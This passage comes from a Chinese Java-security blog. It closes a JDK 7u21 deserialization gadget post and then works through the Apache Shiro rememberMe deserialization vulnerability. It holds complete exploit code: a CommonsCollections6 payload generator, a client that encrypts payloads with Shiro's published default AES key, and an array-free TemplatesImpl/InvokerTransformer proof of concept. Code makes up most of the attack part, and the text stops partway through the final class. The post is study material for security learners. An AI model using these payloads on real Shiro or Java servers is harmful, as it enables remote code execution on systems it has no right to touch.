&quot;_name&quot;, &quot;Ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;String, Object&gt; memberValue = new HashMap&lt;String, Object&gt;();  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,&quot;Ku1s&quot;);  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class); //得到构造器  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        InvocationHandler  handler = (InvocationHandler) constructor.newInstance(Templates.class, memberValue); //实例化  </span><br><span class="line">  </span><br><span class="line">        //然后就是生成动态代理  </span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashSet hashSet = new LinkedHashSet();  </span><br><span class="line">        hashSet.add(templates);  </span><br><span class="line">        hashSet.add(proxy);  </span><br><span class="line">  </span><br><span class="line">        memberValue.put(&quot;f5a5a608&quot;,templates);  </span><br><span class="line">        byte[] bytes = serialize(hashSet);  </span><br><span class="line">        unserialize(bytes);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilTest.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class EvilTest extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public EvilTest() throws Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有点杂乱，但通过这次学习明白了许多知识点，还会继续学习，后面会分析 8u20，7u21在 7u25中修复了，但还是会有安全问题。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《JAVA安全漫谈》</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-Shiro反序列化详解</title>
      <link href="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>参考 ：<a href="https://blog.csdn.net/m0_67401270/article/details/126721347">Shiro环境搭建</a></p><h1 id="前景回顾"><a href="#前景回顾" class="headerlink" title="前景回顾"></a>前景回顾</h1><p>shiro爆出了一个默认key的反序列化漏洞。至今已有大量的分析文章分析了该漏洞的原理，所以本文不再重复分析该漏洞的相关原理，可以参考以下几篇文章的分析：</p><ul><li><a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li></ul><p>也可以参考我在CSDN 中写过的文章:<br><a href="https://blog.csdn.net/snowlyzz/article/details/128192360?spm=1001.2014.3001.5501">[Java反序列化]—Shiro反序列化(二)_反序列化cc链_snowlyzz的博客-CSDN博客</a><br>原因可能是当时写的不够详细，也不够深入，至此，本站的博客都 会打造一个 详细深入的学习</p><p>进入正题：</p><p>如果登录时选择了remember me的多选框，则登录成功后服务端会返回一个rememberMe的Cookie：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>对此，我们攻击过程如下： </p><ol><li>使用以前学过的CommonsCollections利用链生成一个序列化Payload </li><li>使用Shiro默认Key进行加密 </li><li>将密文作为rememberMe的Cookie发送给服务端：</li></ol><p>这里结合CC6  编写成一个CLASS进行触发链子：</p><p>CC6.CLASS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class CommonsCollections6 &#123;</span><br><span class="line">    public byte[] getPayload(String command) throws Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,</span><br><span class="line">                        new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,</span><br><span class="line">                        new String[] &#123; command &#125;),</span><br><span class="line">                new ConstantTransformer(1),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(&quot;keykey&quot;);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        return barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String []args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollections6().getPayload(&quot;calc.exe&quot;);  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是将 参数传入CC6 ，再将payload 进行 aes 加密，传入 Shiro 客户端中会发现结果没有像预想那样 弹出计算器，这是为什么？</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/x.jpg"></p><p>我们从报错信息 从下往上看， 看到倒数第一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>可以看到这是一个 ObjectInputStream 的一个内置类，重写了其 resolveClass 方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ClassResolvingObjectInputStream extends ObjectInputStream &#123;  </span><br><span class="line">  </span><br><span class="line">    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">        super(inputStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Resolves an &#123;@link ObjectStreamClass&#125; by delegating to Shiro&#x27;s   </span><br><span class="line">     * &#123;@link ClassUtils#forName(String)&#125; utility method, which is known to work in all ClassLoader environments.  </span><br><span class="line">     ** @param osc the ObjectStreamClass to resolve the class name.  </span><br><span class="line">     * @return the discovered class  </span><br><span class="line">     * @throws IOException never - declaration retained for subclass consistency  </span><br><span class="line">     * @throws ClassNotFoundException if the class could not be found in any known ClassLoader  </span><br><span class="line">     */    @Override  </span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            return ClassUtils.forName(osc.getName());  </span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;  </span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```txt</span><br><span class="line">**resolveClass这个方法是Java原生反序列的时候必定会调用的，这里重写了就不会调用Java内置的resolveClass了**</span><br></pre></td></tr></table></figure><p>resolveClass 是反序列化用来查找类的一个方法，在读取序列化流的时候，督导一个字符串形式的类名，需要通过这个方法来找到对应的 Java.lang.CLass对象</p><p>对比一下其父类的 resolveClass，也就是 ObjectInputStream 中的  方法 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)  </span><br><span class="line">    throws IOException, ClassNotFoundException  </span><br><span class="line">&#123;  </span><br><span class="line">    String name = desc.getName();  </span><br><span class="line">    try &#123;  </span><br><span class="line">        return Class.forName(name, false, latestUserDefinedLoader());  </span><br><span class="line">    &#125; catch (ClassNotFoundException ex) &#123;  </span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);  </span><br><span class="line">        if (cl != null) &#123;  </span><br><span class="line">            return cl;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            throw ex;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别就是 前者用的是 org.apache.shiro.util.ClassUtils#forName , 先跟进这个forName ClassUtils#看一眼  这里首先使用了THREAD_CL_ACCESSOR.loadClass类加载器，这里手动F9就会发现fqcn变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[L是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</span><br></pre></td></tr></table></figure><p>那么我们在异常捕捉的位置下个断点，看看是哪个类触发了异常：</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/5.jpg"></p><p>可见，出异常时加载的类名为&#96;&#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Lorg.apache.commons.collections.Transformer; 。这个类名看起来 怪，其实就是表示 org.apache.commons.collections.Transformer 的数组。</span><br></pre></td></tr></table></figure><p>看了网上文章的解释是 ：</p><ol><li>数组形式会使得shiro想尝试从本地加载时，path也被赋上数组标识，导致无法从本地jar包中正常获取。</li><li>Class.forName 支持加载数组，而 ClassLoader.loadClass 不支持 加载数组，这个区别导致了问题。</li></ol><p>这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p><h1 id="构造不含数组的反序列化链"><a href="#构造不含数组的反序列化链" class="headerlink" title="构造不含数组的反序列化链"></a>构造不含数组的反序列化链</h1><p>我们的链子 要满足没有数组的情况，也就是不能用 ChainedTransformer#transform</p><p>参考 安全漫谈和此文<br><a href="https://www.anquanke.com/post/id/192619">Java反序列化利用链分析之Shiro反序列化-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>我们可以用到 TemplatesImpl 也就是我们的CC3 来进行拼接，我们可以通过以下几行代码来执行一段JAVA 的字节码 ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">    TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">    setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">    setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">    setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 我们又可以 使用 InvokeTransformer 去反射调用 TemplatesImpl#newTransformer方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123; </span><br><span class="line">new ConstantTransformer(obj), </span><br><span class="line">new InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;</span><br></pre></td></tr></table></figure><p>不过这里任然是 数组，那么如何 过程中的 Transformer数组呢？</p><p>在CC6中 用到了一个类   TiedMapEntry ，其构造方法中接收两个参数，一个是Map  ，第二个是Key</p><p>TiedMapEntry 有个 getValue 方法，调用了 map 的get 方法，并且传入了 key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123; </span><br><span class="line">return map.get(key); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当这个map是LazyMap时，其get方法就是触发transform的关键点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;  </span><br><span class="line">    // create value for key if key is not currently in the map  </span><br><span class="line">    if (map.containsKey(key) == false) &#123;  </span><br><span class="line">        Object value = factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        return value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 LazyMap#get 方法的参数key是不关心的，因为 通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化 恶意对象。</p><p>但是 此时我们无法使用Transformer 数组了，也就不能再使用 ConstantTransformer。</p><p>我们将注意力关注在  InvokerTransformer.transform上</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/tr.png"></p><p>这里是最经典的反射写法，根据传入的 input对象，调用其 iMethodName(可控) 那么如果这里传入的是我们构造好的 TemplatesImpl 对象呢，他是否可以调用 newtransform加载字节码</p><p>很明显，这样我们就可以通过将<code>iMethodName</code>置为<code>newTransformer</code>，从而完成后续的templates gadgets。</p><p>这里将 构造好的TemplatesImpl 对象 (key) 作为 InvokerTransformer.transform的函数的input传入，我们就可以将链子串联起来了</p><h1 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h1><p>首先还是 创建利用点  TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后我们创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，此时先传入一 个人畜无害的方法，比如 getClass ，避免恶意方法在构造Gadget的时候触发：</p><p><code>Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</code></p><p>再把 CC6的代码复制过来 然后改上一节说到的点，就是将原来TiedMapEntry 构造时的第二个参数key，改为前面创建的 TemplatesImpl 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap innermap = new HashMap();  </span><br><span class="line">//outMap = LazyMap.class  </span><br><span class="line">Map outmap = LazyMap.decorate(innermap, transformer); </span><br><span class="line">//此时 factory=InvokerTransformer.transform(key)  此时要调用get传key进去  </span><br><span class="line">  </span><br><span class="line">//接上LazyMap 调用get 传key 步骤：  </span><br><span class="line">TiedMapEntry tme = new TiedMapEntry(outmap, obj);  </span><br><span class="line">  </span><br><span class="line">Map expMap = new HashMap();  </span><br><span class="line">expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">outmap.clear();</span><br></pre></td></tr></table></figure><p>这里使用 outerMap.remove(“keykey”); 来移 除key的副作用，现在是通过 outerMap.clear(); ，效果相同。 </p><h2 id="调用顺序"><a href="#调用顺序" class="headerlink" title="调用顺序"></a>调用顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put()</span><br><span class="line">=&gt;java.util.HashMap.hash()</span><br><span class="line">=&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry#hashCode()</span><br><span class="line">=&gt;TiedMapEntry#getValue(key=Transform恶意类)</span><br><span class="line"></span><br><span class="line">LazyMap#get()</span><br><span class="line">=&gt; LazyMap.decorate(Map=innerMap, factory=InvokerTransformer)</span><br><span class="line">=&gt; get() -&gt; InvokerTransformer.transform(Transform恶意类)</span><br><span class="line"></span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">input = Transform恶意类</span><br><span class="line">iMethodName = newTransformer (可控)</span><br><span class="line">iParamTypes = code (可控)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，将 InvokerTransformer 的方法从人畜无害的 getClass ，改成 newTransformer ，正式完成武 器装配。</p><p>完整POC：</p><p>CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            //TemplatesImpl恶意类  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            //Faketransform  </span><br><span class="line">            Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);  </span><br><span class="line">            //LazyMap.class  </span><br><span class="line">            Map innerMap = new HashMap();  </span><br><span class="line">            Map outerMap = LazyMap.decorate(innerMap, transformer);  </span><br><span class="line">            //TiedMapEntry.class  </span><br><span class="line">            TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  </span><br><span class="line">            //HashMap.class  </span><br><span class="line">            Map expMap = new HashMap();  </span><br><span class="line">            expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">            outerMap.clear();  </span><br><span class="line">            //将假的transform 中的  method 改成 newTransformer            setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);  </span><br><span class="line">  </span><br><span class="line">            // ==================  </span><br><span class="line">            // 生成序列化字符串  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(expMap);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  